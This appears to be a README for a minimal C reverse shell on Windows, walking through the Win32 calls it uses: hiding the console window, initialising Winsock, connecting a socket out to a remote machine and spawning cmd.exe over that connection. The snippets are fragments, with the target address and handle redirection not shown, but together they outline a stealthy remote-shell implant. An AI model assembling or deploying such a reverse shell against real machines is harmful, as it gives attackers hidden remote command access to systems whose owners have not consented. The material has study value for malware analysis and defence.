## About this simple low level reverse shell
#### introduction
the main thing in exploit developement, malware analyse or any other topic when you are writing an exploit is how to deal with remote servers or machines and receive/ send data, so that you have to be familiar with the SOCKETs.

socket is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network

recognize that we talk about the low level language like c/c++. so first of all you have to install all prerequired stuff, an IDE, a compiler and a debugger which you can find them [here](https://code.visualstudio.com/docs/languages/cpp#_install-a-compiler)

#### The functions I've used
1. [ShowWindow](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjh_t6mjP35AhXFglwKHcEcBgwQFnoECAQQAw&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fwinuser%2Fnf-winuser-showwindow&usg=AOvVaw0m88U6DTLNGTpAJUXh7Wlp)
```c
ShowWindow( GetConsoleWindow(), SW_HIDE ); // hide the console of the current process from the user interface and run it in the background
```
2. [WSAStartup](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwihhcTUjP35AhXeQ0EAHTIQAhUQFnoECAYQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fwinsock%2Fnf-winsock-wsastartup&usg=AOvVaw2dl7R4ZunjRdgaij7U1u_-)
```c
WSAStartup(MAKEWORD(2, 2), &wsa); // initialize winsock
```
3. [WSASocket](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjrgOvhjP35AhV-QUEAHQy7C2cQFnoECAYQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fwinsock2%2Fnf-winsock2-wsasocketa&usg=AOvVaw1w00qrcKKbcugzayOhuo_o)
```c
shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
```
4. [WSAConnect](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiJhcfzjP35AhWOS0EAHQbQDc4QFnoECAIQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fwinsock2%2Fnf-winsock2-wsaconnect&usg=AOvVaw11903FO_fI_g-PltsdS2hX)
```c
connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
```
5. [CreateProcess](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjn15SAjf35AhWSmFwKHY2SDdwQFnoECAMQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fprocessthreadsapi%2Fnf-processthreadsapi-createprocessa&usg=AOvVaw3muVjZWA6DzAcUd32dbaSO)
```c
CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // create proccess that spawn command prompt (shell)
```
6. [WaitForSingleObject](https://www.google.com/url?sa=t&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiKie6Tjf35AhXlQkEAHSMXDFwQFnoECAgQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fsynchapi%2Fnf-synchapi-waitforsingleobject&usg=AOvVaw1QxSMBrJFbVO2ai8p37N79)
```c
WaitForSingleObject(pi.hProcess, INFINITE); \\ wait the process until it ends and close the soxket
```
7. [CloseHandle](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwib3Pahjf35AhWbi1wKHRA2AqMQFnoECAkQAQ&url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fapi%2Fhandleapi%2Fnf-handleapi-closehandle&usg=AOvVaw0WzqOSJjwQS5kHDz5cTv71)
```c
CloseHandle(pi.hProcess);
```